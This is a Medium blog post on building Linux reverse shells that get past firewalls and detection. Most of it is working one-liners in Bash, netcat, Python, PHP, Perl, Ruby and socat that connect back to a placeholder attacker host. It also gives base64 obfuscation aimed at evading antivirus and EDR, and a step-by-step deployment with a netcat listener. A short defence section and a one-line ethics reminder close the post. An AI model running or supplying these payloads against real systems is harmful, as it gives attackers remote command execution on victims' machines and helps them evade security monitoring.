::: {}
# Linux Reverse Shell that (Almost) Always Works {#linux-reverse-shell-that-almost-always-works .p-name}
:::

::: {.section .p-summary field="subtitle"}
In the field of penetration testing and ethical hacking, a reverse shell
is one of the most effective and widely-used tools. It allows an...
:::

::::::::::::::::::::::::::::::::::::::::::::::::::::::: {.section .e-content field="body"}
:::::: {#b04f .section .section .section--body .section--first}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Linux Reverse Shell that (Almost) Always Works {#bf04 .graf .graf--h3 .graf--leading .graf--title name="bf04"}

<figure id="0dda" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*DfcWc-GX2czs6n6m.jpg"
class="graf-image" data-image-id="0*DfcWc-GX2czs6n6m.jpg"
data-width="800" data-height="388" />
</figure>

In the field of penetration testing and ethical hacking, a reverse shell
is one of the most effective and widely-used tools. It allows an
attacker to gain remote access to a target machine by executing commands
on the victim's machine through a shell. In the Linux environment,
setting up a reverse shell is common during post-exploitation or lateral
movement in a network. However, not all reverse shells are created
equal; some methods fail due to system restrictions, firewalls, or even
limitations in shell environments.

This blog aims to guide you through creating a **Linux reverse shell**
that (almost) always works. We'll explore different techniques, the
working mechanism of reverse shells, and methods for evading detection
to increase success rates.
:::
::::
::::::

:::::: {#d7a6 .section .section .section--body}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Table of Contents: {#8dc5 .graf .graf--h3 .graf--leading name="8dc5"}

1.  [Introduction to Reverse Shells]{#33a4}
2.  [Reverse Shell vs Bind Shell: Key Differences]{#9f6d}
3.  [Components of a Reverse Shell]{#a872}
4.  [Basic Reverse Shell Techniques]{#ca49}

- [Bash Reverse Shell]{#21af}
- [Netcat Reverse Shell]{#f037}
- [Python Reverse Shell]{#7961}
- [PHP Reverse Shell]{#18b3}

1.  [Advanced Reverse Shell Techniques]{#1a38}

- [Perl Reverse Shell]{#f70a}
- [Ruby Reverse Shell]{#91e1}
- [Socat Reverse Shell]{#97a9}

1.  [Avoiding Common Pitfalls]{#9f30}

- [Firewalls and Port Restrictions]{#f7c7}
- [Proxy Servers]{#bf45}
- [Antivirus and EDR Evasion]{#394e}

1.  [Obfuscation and Encoding Techniques]{#c891}
2.  [Practical Example: Deploying a Linux Reverse Shell]{#e49b}

- [Setting Up a Listener]{#e2d4}
- [Exploiting a Target]{#586a}

1.  [Hardening and Defense Against Reverse Shells]{#bdcf}
2.  [Conclusion]{#2c62}
:::
::::
::::::

:::::: {#f88a .section .section .section--body}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### 1. Introduction to Reverse Shells {#87de .graf .graf--h3 .graf--leading name="87de"}

A **reverse shell** is a type of shell where the target machine
initiates a connection to the attacker's machine. Once the connection is
established, the attacker can execute commands on the target. This is in
contrast to a **bind shell**, where the attacker connects to a listener
set up on the target machine.

In a reverse shell scenario:

- [**Target machine (victim)**: Initiates the connection back to the
  attacker.]{#cacc}
- [**Attacker machine**: Listens for incoming connections and then takes
  control.]{#0cba}

Reverse shells are useful in bypassing firewalls and network
restrictions because outbound connections are typically allowed by
default, whereas inbound connections are blocked.
:::
::::
::::::

:::::: {#9a97 .section .section .section--body}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### 2. Reverse Shell vs Bind Shell: Key Differences {#4842 .graf .graf--h3 .graf--leading name="4842"}

#### Reverse Shell: {#bcbb .graf .graf--h4 .graf-after--h3 name="bcbb"}

- [The target machine (victim) initiates the connection to the
  attacker's machine.]{#2a8a}
- [Often used to bypass firewalls that block incoming connections but
  allow outgoing ones.]{#8b41}

#### Bind Shell: {#d3aa .graf .graf--h4 .graf-after--li name="d3aa"}

- [The target machine (victim) opens a listening port for the attacker
  to connect to.]{#5097}
- [Less effective when firewalls block incoming connections.]{#c93e}

In this blog, we focus primarily on **reverse shells** due to their
higher likelihood of success in restrictive network environments.
:::
::::
::::::

:::::: {#afc3 .section .section .section--body}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### 3. Components of a Reverse Shell {#ac9f .graf .graf--h3 .graf--leading name="ac9f"}

To understand how reverse shells work, let's break them down into two
main components:

#### 1. Listener on the Attacker's Side {#658c .graf .graf--h4 .graf-after--p name="658c"}

- [A listener is set up on the attacker's machine to wait for incoming
  connections.]{#3e02}
- [This listener can be a simple tool like Netcat (`nc`{.markup--code
  .markup--li-code}), Metasploit, or even custom scripts.]{#8847}

#### 2. Payload on the Target Machine {#ff5c .graf .graf--h4 .graf-after--li name="ff5c"}

- [The payload is the code that executes on the target machine to
  initiate the connection.]{#0d9f}
- [This can be written in various languages, such as Bash, Python, PHP,
  or Perl.]{#f11b}
:::
::::
::::::

:::::: {#1ff3 .section .section .section--body}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### 4. Basic Reverse Shell Techniques {#cb79 .graf .graf--h3 .graf--leading name="cb79"}

#### Bash Reverse Shell {#fb06 .graf .graf--h4 .graf-after--h3 name="fb06"}

Bash is the most basic shell available on almost all Linux
distributions, making it a reliable option for reverse shells. Here's a
simple one-liner to set up a Bash reverse shell:

``` {#ec80 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="javascript"}
bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1
```

- [`bash -i`{.markup--code .markup--li-code}: Starts an interactive Bash
  session.]{#a848}
- [`/dev/tcp/attacker_ip/attacker_port`{.markup--code .markup--li-code}:
  Redirects I/O to the attacker\'s IP and port using the TCP
  protocol.]{#7bb8}

#### Netcat Reverse Shell {#67db .graf .graf--h4 .graf-after--li name="67db"}

Netcat (nc) is a powerful tool often referred to as the "Swiss Army
knife" of networking. If Netcat is available on the target system, it
can be used to establish a reverse shell connection.

``` {#6751 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
nc -e /bin/bash attacker_ip attacker_port
```

However, some systems may have restricted Netcat versions without the
`-e`{.markup--code .markup--p-code} flag. In such cases, use the
following command:

``` {#5a37 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
mkfifo /tmp/f; nc attacker_ip attacker_port < /tmp/f | /bin/bash > /tmp/f 2>&1; rm /tmp/f
```

#### Python Reverse Shell {#df50 .graf .graf--h4 .graf-after--pre name="df50"}

Python is commonly installed on Linux machines, and its ability to run
shell commands makes it a great candidate for reverse shells:

``` {#71c9 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="rust"}
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("attacker_ip",attacker_port)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
```

#### PHP Reverse Shell {#0b86 .graf .graf--h4 .graf-after--pre name="0b86"}

If the target machine is running a web server with PHP enabled, you can
use a PHP reverse shell:

``` {#16d8 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="php"}
<?php
$socket=fsockopen("attacker_ip",attacker_port);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
```

You can execute this PHP script by uploading it to the server and then
visiting the URL path where it's hosted.
:::
::::
::::::

:::::: {#7a71 .section .section .section--body}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### 5. Advanced Reverse Shell Techniques {#06d7 .graf .graf--h3 .graf--leading name="06d7"}

#### Perl Reverse Shell {#88c3 .graf .graf--h4 .graf-after--h3 name="88c3"}

Perl, while less common, can be effective in certain environments where
other methods fail:

``` {#1760 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="swift"}
perl -e 'use Socket;$i="attacker_ip";$p=attacker_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Ruby Reverse Shell {#2ed5 .graf .graf--h4 .graf-after--pre name="2ed5"}

Ruby is another language found on many Linux systems:

``` {#ecfc .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="rust"}
ruby -rsocket -e'f=TCPSocket.open("attacker_ip",attacker_port).to_i; exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### Socat Reverse Shell {#79b5 .graf .graf--h4 .graf-after--pre name="79b5"}

Socat is a more advanced tool for network communications, and it
supports encrypted reverse shells:

On the attacker machine, run:

``` {#1cd4 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="vbnet"}
socat OPENSSL-LISTEN:attacker_port,cert=cert.pem,key=key.pem,verify=0 -
```

On the target machine:

``` {#8273 .graf .graf--pre .graf-after--p .graf--trailing .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="ruby"}
socat OPENSSL-CONNECT:attacker_ip:attacker_port,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```
:::
::::
::::::

:::::: {#c1ed .section .section .section--body}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### 6. Avoiding Common Pitfalls {#a2f3 .graf .graf--h3 .graf--leading name="a2f3"}

Reverse shells can fail due to various reasons, such as:

- [**Firewalls**: Outbound firewall rules might block certain
  ports.]{#93a7}
- [**Proxy Servers**: If the target is behind a proxy, direct
  connections may not work.]{#160e}
- [**Antivirus and EDR**: Some reverse shells can be detected by modern
  security tools.]{#040e}

#### Firewalls and Port Restrictions {#0441 .graf .graf--h4 .graf-after--li name="0441"}

To increase the chance of success, use common outbound ports like **80**
(HTTP) or **443** (HTTPS), which are less likely to be blocked.

#### Proxy Servers {#4c5c .graf .graf--h4 .graf-after--p name="4c5c"}

If the target is behind a proxy, tunneling techniques like **SSH** or
**DNS tunneling** may be required.

#### Antivirus and EDR Evasion {#b83d .graf .graf--h4 .graf-after--p name="b83d"}

Use obfuscation techniques and encode payloads to evade detection by
endpoint detection and response (EDR) systems.
:::
::::
::::::

:::::: {#5449 .section .section .section--body}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### 7. Obfuscation and Encoding Techniques {#2060 .graf .graf--h3 .graf--leading name="2060"}

Modern security software often scans for known reverse shell signatures.
To evade detection, you can use encoding or obfuscation techniques.

#### Base64 Encoding {#62e4 .graf .graf--h4 .graf-after--p name="62e4"}

A simple way to obfuscate your payload is to encode it in Base64. Here's
how you can encode a Bash reverse shell:

``` {#ba67 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
echo 'bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1' | base64
```

You can then decode and execute it on the target system:

``` {#2c4a .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
echo 'encoded_string' | base64 -d | bash
```

#### Using Compiled Binaries {#0f68 .graf .graf--h4 .graf-after--pre name="0f68"}

You can also compile your reverse shell into a binary format to make it
harder for security tools to detect. C, Go, and Rust are excellent
languages for this.
:::
::::
::::::

:::::: {#f5af .section .section .section--body}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### 8. Practical Example: Deploying a Linux Reverse Shell {#0b12 .graf .graf--h3 .graf--leading name="0b12"}

Let's walk through a complete example of setting up a reverse shell:

#### Step 1: Setting Up a Listener {#1109 .graf .graf--h4 .graf-after--p name="1109"}

On the attacker's machine, set up a listener using Netcat:

``` {#906d .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="yaml"}
nc -lvnp 4444
```

#### Step 2: Creating the Reverse Shell Payload {#aa61 .graf .graf--h4 .graf-after--pre name="aa61"}

On the target machine, use the Python reverse shell

``` {#2e99 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="rust"}
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("attacker_ip",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
```

#### Step 3: Executing the Payload {#b636 .graf .graf--h4 .graf-after--pre name="b636"}

Once the payload is executed, you should receive a shell on the listener
(attacker) machine.
:::
::::
::::::

:::::: {#5e06 .section .section .section--body}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### 9. Hardening and Defense Against Reverse Shells {#aa94 .graf .graf--h3 .graf--leading name="aa94"}

As important as knowing how to create reverse shells is understanding
how to defend against them.

- [**Firewalls**: Restrict outbound traffic and allow only necessary
  connections.]{#d4a8}
- [**Monitoring**: Use intrusion detection systems (IDS) to detect
  suspicious outbound connections.]{#73ad}
- [**Application Whitelisting**: Ensure that only trusted applications
  can execute on the system.]{#ceb9}
- [**Endpoint Detection and Response (EDR)**: Modern EDR solutions can
  detect and block reverse shells by analyzing behavior
  patterns.]{#a5bb}
:::
::::
::::::

:::::: {#bb05 .section .section .section--body}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### 10. Conclusion {#4b35 .graf .graf--h3 .graf--leading name="4b35"}

A Linux reverse shell is a powerful tool for penetration testers and
attackers alike. By leveraging common tools like Bash, Python, Netcat,
or Socat, you can craft a reverse shell that (almost) always works, even
in restrictive environments. However, with great power comes great
responsibility. Ensure that you use reverse shells ethically and
legally, and always work on hardening systems against such attacks in
real-world environments.

Whether you're a penetration tester looking to add another tool to your
toolkit or an administrator wanting to improve system security,
understanding reverse shells is crucial. Hopefully, this guide has given
you the knowledge and techniques you need to craft reliable reverse
shells and defend against them.
:::
::::
::::::

:::::: {#5a28 .section .section .section--body .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
By continuously evolving reverse shell techniques and staying up to date
with security measures, you'll increase your success in both attack and
defense scenarios.

### Promote and Collaborate on Cybersecurity Insights {#290e .graf .graf--h3 .graf-after--p name="290e"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#5bd4 .graf .graf--h3 .graf-after--p name="5bd4"}

[Vijay
Gupta](https://www.youtube.com%2F@www.youtube.com/@bevijaygupta){.markup--anchor
.markup--p-anchor
data-href="https://www.youtube.com%2F@www.youtube.com/@bevijaygupta"
rel="noopener ugc nofollow noopener" target="_blank"} is a cybersecurity
enthusiast with several years of experience in cyber security, [cyber
crime forensics
investigation](https://www.amazon.com/dp/B0CW4L574N){.markup--anchor
.markup--p-anchor data-href="https://www.amazon.com/dp/B0CW4L574N"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [September 16, 2024](https://medium.com/p/af5fbe214b9f).

[Canonical
link](https://medium.com/@bevijaygupta/linux-reverse-shell-that-almost-always-works-af5fbe214b9f){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
